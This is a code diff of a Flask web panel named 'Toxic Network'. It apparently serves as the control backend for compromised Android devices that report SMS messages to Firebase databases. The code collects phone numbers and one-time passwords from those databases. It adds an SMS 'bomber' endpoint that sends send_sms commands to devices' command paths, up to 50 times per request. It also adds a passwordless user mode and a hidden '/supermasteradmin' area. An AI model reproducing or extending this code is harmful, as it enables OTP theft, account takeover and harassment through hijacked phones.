-.summary{background:#1e1b4b;border:1px solid #4338ca;border-radius:10px;padding:14px;margin-bottom:14px;font-size:13px}
-.summary b{color:#c4b5fd}
-.back{display:inline-block;padding:10px 14px;background:#334155;color:#e2e8f0;text-decoration:none;border-radius:8px;font-size:12px;margin-bottom:12px}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid #334155;border-top-color:#818cf8;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px}
-@keyframes spin{to{transform:rotate(360deg)}}</style></head><body>
+<style>""" + PREMIUM_CSS + """
+.wrap{max-width:800px;margin:0 auto}
+h1{font-size:20px;font-weight:800;margin-bottom:8px;color:#f1f5f9}
+.sub{font-size:13px;color:#94a3b8;margin-bottom:20px;word-break:break-all}
+.card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:16px;margin-bottom:12px;font-size:13px}
+.path{color:#f59e0b;font-weight:700;margin-bottom:8px;word-break:break-all}
+.status-ok{color:#10b981;font-weight:700;margin-bottom:8px}
+.status-empty{color:#94a3b8;font-weight:700;margin-bottom:8px}
+.data{background:#0f172a;border:1px solid #334155;border-radius:10px;padding:12px;color:#cbd5e1;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto}
+.back{display:inline-block;padding:10px 16px;background:#334155;color:#f1f5f9;text-decoration:none;border-radius:10px;font-size:13px;font-weight:600;margin-bottom:20px}
+</style></head><body>
 <div class="wrap">
-<a href="/firebases" class="back">← Back</a>
+<a href="/supermasteradmin/firebases" class="back">← Back to Firebases</a>
 <h1>🔍 Raw Data Explorer</h1>
-<div class="sub" id="sub">Loading...</div>
-<div class="summary" id="summary" style="display:none">Scanning...</div>
+<div class="sub" id="sub">Device: ...</div>
 <div id="results"></div>
 </div>
 <script>
@@ -2832,20 +2101,18 @@ const DEV = params.get('id');
 document.getElementById('sub').textContent = 'Device: ' + DEV;
 async function scan(){
   const results = document.getElementById('results');
-  results.innerHTML = '<div class="card"><span class="spinner"></span>Scanning...</div>';
+  results.innerHTML = '<div class="card"><span class="spinner"></span> Scanning...</div>';
   try{
     const r = await fetch('/api/rawdata?fb=' + encodeURIComponent(FB) + '&id=' + encodeURIComponent(DEV));
     const d = await r.json();
-    if(!d.success){ results.innerHTML = '<div class="card status-empty">❌ '+(d.error||'Error')+'</div>'; return; }
-    document.getElementById('summary').style.display = 'block';
-    document.getElementById('summary').innerHTML = `🔎 <b>${d.scanned} paths</b> scanned — <b>${d.found}</b> with data`;
+    if(!d.success){ results.innerHTML = '<div class="card status-empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
     results.innerHTML = d.results.map(item => {
       const cls = item.status === 'has_data' ? 'status-ok' : 'status-empty';
-      const statusTxt = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ` — ${item.message_count} msgs` : '') : '⚪ Empty';
+      const statusTxt = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ` — ${item.message_count} MSGS` : '') : '⚪ EMPTY';
       const dataTxt = item.data ? JSON.stringify(item.data, null, 2).slice(0, 3000) : '';
       return `<div class="card"><div class="path">${item.path}</div><div class="${cls}">${statusTxt}</div>${dataTxt ? `<div class="data">${escapeHtml(dataTxt)}</div>` : ''}</div>`;
     }).join('');
-  }catch(e){ results.innerHTML = '<div class="card status-empty">❌ Network error</div>'; }
+  }catch(e){ results.innerHTML = '<div class="card status-empty">❌ NETWORK ERROR</div>'; }
 }
 function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
 scan();
@@ -2853,24 +2120,82 @@ scan();
 </body></html>
 """
 
+# ==================== PERSONAL OTP HTML ====================
+PERSONAL_OTP_HTML = r"""<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Personal OTP — Toxic Network</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#0f172a">
+<style>""" + PREMIUM_CSS + r"""
+</style></head><body>
+
+<div class="topbar">
+<div class="brand">🔑 Personal<span>OTP</span></div>
+</div>
+
+<div class="container">
+<a href="/" class="back-link" style="display:inline-flex;align-items:center;gap:8px;padding:10px 16px;background:#334155;color:#f1f5f9;border-radius:10px;font-size:13px;font-weight:600;text-decoration:none;margin-bottom:20px">← Back to Dashboard</a>
+
+<div class="sec-card">
+<h3>➕ Add Your Firebase URL</h3>
+<p class="desc">Apna Firebase URL add karo apni private OTP monitoring ke liye. Ye tumhare browser me save hoga — doosre users ko nahi dikhega.</p>
+<div class="form-group">
+<input id="fb-url" placeholder="https://xxx.firebaseio.com" type="url" autocomplete="off">
+</div>
+<button class="btn btn-primary" onclick="addFirebase()">Add Firebase</button>
+<div id="msg" class="msg" style="margin-top:16px;padding:12px;border-radius:10px;font-size:13px;display:none;text-align:center;font-weight:600"></div>
+</div>
+
+<div class="sec-card">
+<h3>ℹ️ How It Works</h3>
+<p class="desc" style="margin-bottom:8px">1. Apna Firebase URL paste karo</p>
+<p class="desc" style="margin-bottom:8px">2. Ye tumhare browser cookie me store hoga (private)</p>
+<p class="desc" style="margin-bottom:8px">3. Dashboard pe wapas jaake numbers dekh sakte ho</p>
+<p class="desc" style="margin-bottom:0">4. Koi bhi URL share nahi hota — sirf tum dekhte ho</p>
+</div>
+</div>
+
+<script>
+function showMsg(text, type){
+  const el = document.getElementById('msg');
+  el.style.display = 'block';
+  el.style.background = type === 'ok' ? 'rgba(16,185,129,.1)' : 'rgba(239,68,68,.1)';
+  el.style.color = type === 'ok' ? '#10b981' : '#ef4444';
+  el.textContent = text;
+  if(type === 'ok') setTimeout(()=>el.style.display='none', 3000);
+}
+
+async function addFirebase(){
+  const url = document.getElementById('fb-url').value.trim();
+  if(!url){ showMsg('❌ URL required', 'err'); return; }
+  let fullUrl = url.startsWith('http') ? url : 'https://' + url;
+  if(!fullUrl.includes('firebase')){ showMsg('❌ Invalid firebase URL', 'err'); return; }
+  
+  try{
+    const r = await fetch('/api/otp/add', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url: fullUrl}) });
+    const d = await r.json();
+    if(d.success){ 
+      showMsg('✅ Firebase added successfully!', 'ok'); 
+      document.getElementById('fb-url').value = '';
+    } else { showMsg('❌ ' + (d.error || 'Error'), 'err'); }
+  }catch(e){ showMsg('❌ Network error', 'err'); }
+}
+</script>
+</body></html>
+"""
 
 # ==================== ROUTES ====================
 @app.route("/login", methods=["GET", "POST"])
 def login_page():
-    if session.get("logged_in") and session.get("role") == "user":
+    state = get_user_panel_state()
+    if not state["active"]:
+        return Response(PANEL_OFFLINE_HTML, mimetype="text/html")
+    if state["passwordless"]:
+        session["logged_in"] = True
+        session["role"] = "user"
         return redirect(url_for("user_dashboard"))
-    error = ""
-    if request.method == "POST":
-        pwd = request.form.get("password", "")
-        if pwd == get_pwd("user"):
-            session["logged_in"] = True
-            session["role"] = "user"
-            return redirect(url_for("user_dashboard"))
-        error = '<div class="err">❌ Wrong password!</div>'
-    return Response(LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")
+    return redirect(url_for("user_dashboard")) # Since login_required auto-logs in
 
-
-@app.route("/admin", methods=["GET", "POST"])
+@app.route("/supermasteradmin", methods=["GET", "POST"])
 def admin_login_page():
     if session.get("logged_in") and session.get("role") == "admin":
         return redirect(url_for("admin_dashboard"))
@@ -2881,69 +2206,133 @@ def admin_login_page():
             session["logged_in"] = True
             session["role"] = "admin"
             return redirect(url_for("admin_dashboard"))
-        error = '<div class="err">❌ Wrong admin password!</div>'
+        error = '<div class="err">❌ ACCESS DENIED — ROOT KEY REQUIRED</div>'
     return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")
-
 
 @app.route("/logout")
 def logout():
     session.clear()
-    return redirect(url_for("login_page"))
-
+    return redirect(url_for("user_dashboard"))
 
 @app.route("/")
 @login_required
 def user_dashboard():
+    state = get_user_panel_state()
+    if not state["active"]:
+        return Response(PANEL_OFFLINE_HTML, mimetype="text/html")
     return Response(USER_DASHBOARD_HTML, mimetype="text/html")
 
-
 @app.route("/otp")
+@login_required
 def personal_otp():
     return Response(PERSONAL_OTP_HTML, mimetype="text/html")
 
-
-@app.route("/admin/dashboard")
+@app.route("/supermasteradmin/dashboard")
 @admin_required
 def admin_dashboard():
     return Response(ADMIN_DASHBOARD_HTML, mimetype="text/html")
 
-
-@app.route("/admin/security")
+@app.route("/supermasteradmin/security")
 @admin_required
 def admin_security():
     return Response(SECURITY_HTML, mimetype="text/html")
 
+@app.route("/supermasteradmin/smslogs")
+@admin_required
+def admin_smslogs():
+    return Response(SMS_LOGS_HTML, mimetype="text/html")
 
-@app.route("/firebases")
+@app.route("/supermasteradmin/firebases")
 @admin_required
 def firebases_page():
     return Response(FIREBASES_HTML, mimetype="text/html")
 
-
-@app.route("/firebase/<fb_id>")
+@app.route("/supermasteradmin/firebase/<fb_id>")
 @admin_required
 def firebase_view_page(fb_id):
     return Response(FIREBASE_VIEW_HTML.replace("{{FB_ID}}", fb_id), mimetype="text/html")
 
-
-@app.route("/debug")
+@app.route("/supermasteradmin/debug")
 @admin_required
 def debug_page():
     return Response(DEBUG_HTML, mimetype="text/html")
 
+# ==================== PANEL STATE APIS ====================
+@app.route("/api/panel/status")
+@admin_required
+def api_panel_status():
+    state = get_user_panel_state()
+    return jsonify({"success": True, **state})
+
+@app.route("/api/panel/status_public")
+def api_panel_status_public():
+    state = get_user_panel_state()
+    return jsonify({
+        "success": True,
+        "active": state["active"],
+        "expires_at": state["expires_at"],
+        "passwordless": state["passwordless"],
+        "bomber_active": state["bomber_active"],
+        "now": state["now"],
+    })
+
+@app.route("/api/panel/activate", methods=["POST"])
+@admin_required
+def api_panel_activate():
+    data = request.get_json() or {}
+    try:
+        minutes = int(data.get("minutes", 0))
+    except Exception:
+        minutes = 0
+    if minutes > 0:
+        expires_at = int(time.time()) + minutes * 60
+        set_setting("user_panel_expires_at", expires_at)
+    else:
+        set_setting("user_panel_expires_at", 0)
+    set_setting("user_panel_active", "true")
+    return jsonify({"success": True})
+
+@app.route("/api/panel/deactivate", methods=["POST"])
+@admin_required
+def api_panel_deactivate():
+    set_setting("user_panel_active", "false")
+    set_setting("user_panel_expires_at", 0)
+    return jsonify({"success": True})
+
+@app.route("/api/panel/passwordless", methods=["POST"])
+@admin_required
+def api_panel_passwordless():
+    data = request.get_json() or {}
+    enabled = bool(data.get("enabled", False))
+    try:
+        minutes = int(data.get("minutes", 0))
+    except Exception:
+        minutes = 0
+    set_setting("passwordless_mode", "true" if enabled else "false")
+    if enabled and minutes > 0:
+        set_setting("passwordless_expires_at", int(time.time()) + minutes * 60)
+    else:
+        set_setting("passwordless_expires_at", 0)
+    return jsonify({"success": True})
+
+@app.route("/api/panel/bomber", methods=["POST"])
+@admin_required
+def api_panel_bomber():
+    data = request.get_json() or {}
+    enabled = bool(data.get("enabled", False))
+    set_setting("sms_bomber_active", "true" if enabled else "false")
+    return jsonify({"success": True})
 
 # ==================== API ROUTES ====================
 @app.route("/api/conn")
 def api_conn():
     return jsonify({"success": True, "mongo_connected": MONGO_OK})
 
-
 @app.route("/api/refresh", methods=["POST"])
 @login_required
 def api_refresh():
     threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True})
-
 
 @app.route("/api/numbers")
 @login_required
@@ -2967,7 +2356,6 @@ def api_numbers():
         "offline": stats.get("offline", 0), "otp_rate": stats.get("otp_rate", 0),
         "loading": loading, "progress": progress, "firebases_total": fb_total,
     })
-
 
 @app.route("/api/inbox")
 def api_inbox():
@@ -3013,8 +2401,95 @@ def api_inbox():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
+@app.route("/api/sms/send", methods=["POST"])
+@login_required
+def api_sms_send():
+    try:
+        data = request.get_json() or {}
+        fb_url = data.get("fb_url", "").strip()
+        device_id = data.get("device_id", "").strip()
+        target = data.get("target", "").strip()
+        message = data.get("message", "").strip()
+        count = int(data.get("count", 1))
 
-# ==================== PERSONAL OTP APIs ====================
+        if not fb_url or not device_id or not target or not message:
+            return jsonify({"success": False, "error": "All fields required"}), 400
+
+        panel_state = get_user_panel_state()
+        if not panel_state["bomber_active"]:
+            return jsonify({"success": False, "error": "SMS Sender is currently disabled by Admin"}), 403
+
+        if count > 50:
+            count = 50
+        if count < 1:
+            count = 1
+
+        base = fb_url.rstrip("/")
+        paths = [
+            f"/commands/{device_id}.json",
+            f"/sendSMS/{device_id}.json",
+            f"/sms/{device_id}.json",
+            f"/tasks/{device_id}.json"
+        ]
+
+        payload = {
+            "command": "send_sms",
+            "action": "send_sms",
+            "to": target,
+            "message": message,
+            "timestamp": int(time.time() * 1000)
+        }
+
+        sent = 0
+        for _ in range(count):
+            for p in paths:
+                try:
+                    requests.post(base + p, json=payload, timeout=5)
+                except Exception:
+                    pass
+            sent += 1
+            if count > 1:
+                time.sleep(0.5)
+
+        if MONGO_OK:
+            try:
+                sms_logs_collection.insert_one({
+                    "fb_url": fb_url,
+                    "device_id": device_id,
+                    "target": target,
+                    "message": message,
+                    "count": sent,
+                    "timestamp": int(time.time()),
+                    "ip": request.remote_addr
+                })
+            except Exception as e:
+                print(f"[sms_logs] insert failed: {e}")
+
+        return jsonify({"success": True, "count": sent})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/sms/logs")
+@admin_required
+def api_sms_logs():
+    if not MONGO_OK:
+        return jsonify({"success": False, "error": "MongoDB down"}), 500
+    try:
+        logs = list(sms_logs_collection.find({}).sort("timestamp", -1).limit(100))
+        out = []
+        for l in logs:
+            out.append({
+                "target": l.get("target"),
+                "message": l.get("message"),
+                "count": l.get("count"),
+                "device_id": l.get("device_id"),
+                "timestamp": l.get("timestamp"),
+                "ip": l.get("ip", "N/A"),
+            })
+        return jsonify({"success": True, "logs": out})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
 @app.route("/api/otp/add", methods=["POST"])
 def api_otp_add():
     if not MONGO_OK:
@@ -3038,70 +2513,6 @@ def api_otp_add():
         return jsonify({"success": True, "hash": fb_hash(url)})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
-
-
-@app.route("/api/otp/data", methods=["POST"])
-def api_otp_data():
-    try:
-        data = request.get_json() or {}
-        urls = data.get("urls", [])
-        if not isinstance(urls, list) or not urls:
-            return jsonify({"success": False, "error": "No firebase URLs provided"}), 400
-
-        all_numbers = []
-        total_online = 0
-        total_offline = 0
-        total_otp = 0
-        total_msg = 0
-
-        for url in urls[:20]:
-            try:
-                devices = fetch_devices_from_one_fb(url, "user_fb", "")
-                for dev in devices:
-                    is_dev_online = dev.get("online", False)
-                    if is_dev_online: total_online += 1
-                    else: total_offline += 1
-                    for sim in dev.get("sims", []):
-                        num = sim["number"]
-                        msgs = dev.get("per_number", {}).get(num, [])
-                        otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
-                        total_otp += otp_count
-                        total_msg += len(msgs)
-                        all_numbers.append({
-                            "number": num,
-                            "device_id": dev["id"],
-                            "device_name": dev.get("name", ""),
-                            "firebase": url,
-                            "online": is_dev_online,
-                            "msg_count": len(msgs),
-                            "otp_count": otp_count,
-                            "confidence": sim.get("confidence", 0),
-                        })
-            except Exception as e:
-                print(f"otp data error: {e}")
-                continue
-
-        seen = set()
-        unique_numbers = []
-        for n in all_numbers:
-            key = n["number"]
-            if key in seen: continue
-            seen.add(key)
-            unique_numbers.append(n)
-
-        otp_rate = int((total_otp / total_msg) * 100) if total_msg > 0 else 0
-
-        return jsonify({
-            "success": True,
-            "numbers": unique_numbers,
-            "total": len(unique_numbers),
-            "online": sum(1 for n in unique_numbers if n.get("online")),
-            "offline": sum(1 for n in unique_numbers if not n.get("online")),
-            "otp_rate": otp_rate,
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
 
 @app.route("/api/rawdata")
 @admin_required
@@ -3138,7 +2549,6 @@ def api_rawdata():
         results.append(item)
     return jsonify({"success": True, "scanned": len(paths), "found": found, "results": results})
 
-
 @app.route("/api/security/change", methods=["POST"])
 @admin_required
 def api_security_change():
@@ -3154,8 +2564,6 @@ def api_security_change():
         return jsonify({"success": True, "message": f"{role} password saved to MongoDB"})
     return jsonify({"success": False, "error": "Failed to save password (MongoDB down)"}), 500
 
-
-# ✅ Firebases list with per-firebase stats
 @app.route("/api/firebases", methods=["GET"])
 @admin_required
 def api_fb_list():
@@ -3165,15 +2573,10 @@ def api_fb_list():
         docs = list(fb_collection.find({}).sort("added_at", -1))
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
-    
-    # ✅ Get cached stats
     with cache["lock"]:
         fb_stats = dict(cache["fb_stats"]) if cache["fb_stats"] else {}
-    
-    # Agar cache empty hai, toh background me fetch trigger karo
     if not fb_stats:
         threading.Thread(target=fetch_fb_stats, daemon=True).start()
-    
     out = []
     for d in docs:
         url = d.get("url", "")
@@ -3188,7 +2591,6 @@ def api_fb_list():
             "stats": stats,
         })
     return jsonify({"success": True, "firebases": out, "count": len(out)})
-
 
 @app.route("/api/firebase/<fb_id>", methods=["GET"])
 @admin_required
@@ -3229,7 +2631,6 @@ def api_fb_view(fb_id):
         "numbers": numbers,
     })
 
-
 @app.route("/api/firebases", methods=["POST"])
 @admin_required
 def api_fb_add():
@@ -3247,7 +2648,6 @@ def api_fb_add():
     fb_collection.insert_one({"url": url, "name": name, "added_at": int(time.time()), "source": "admin"})
     threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True})
-
 
 @app.route("/api/firebases/bulk", methods=["POST"])
 @admin_required
@@ -3272,7 +2672,6 @@ def api_fb_bulk():
     threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True, "added": added, "skipped": skipped})
 
-
 @app.route("/api/firebases/<fb_id>", methods=["DELETE"])
 @admin_required
 def api_fb_delete(fb_id):
@@ -3281,11 +2680,9 @@ def api_fb_delete(fb_id):
     try:
         doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
         fb_url = doc.get("url", "") if doc else ""
-
         res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
         if res.deleted_count == 0:
             return jsonify({"success": False, "error": "Not found"}), 404
-
         with cache["lock"]:
             cache["numbers_map"] = {}
             cache["devices"] = {}
@@ -3293,12 +2690,10 @@ def api_fb_delete(fb_id):
             cache["msg_cache_time"] = {}
             cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
             cache["fb_stats"] = {}
-
         threading.Thread(target=refresh_cache, daemon=True).start()
         return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 400
-
 
 @app.route("/api/firebases/bulk-delete", methods=["POST"])
 @admin_required
@@ -3314,7 +2709,6 @@ def api_fb_bulk_delete():
             deleted += res.deleted_count
         except Exception:
             pass
-
     with cache["lock"]:
         cache["numbers_map"] = {}
         cache["devices"] = {}
@@ -3322,10 +2716,8 @@ def api_fb_bulk_delete():
         cache["msg_cache_time"] = {}
         cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
         cache["fb_stats"] = {}
-
     threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True, "deleted": deleted})
-
 
 @app.route("/api/firebases/all", methods=["DELETE"])
 @admin_required
@@ -3334,7 +2726,6 @@ def api_fb_delete_all():
         return jsonify({"success": False, "error": "MongoDB down"}), 500
     try:
         res = fb_collection.delete_many({})
-
         with cache["lock"]:
             cache["numbers_map"] = {}
             cache["devices"] = {}
@@ -3342,7 +2733,6 @@ def api_fb_delete_all():
             cache["msg_cache_time"] = {}
             cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
             cache["fb_stats"] = {}
-
         threading.Thread(target=refresh_cache, daemon=True).start()
         return jsonify({"success": True, "deleted": res.deleted_count})
     except Exception as e:
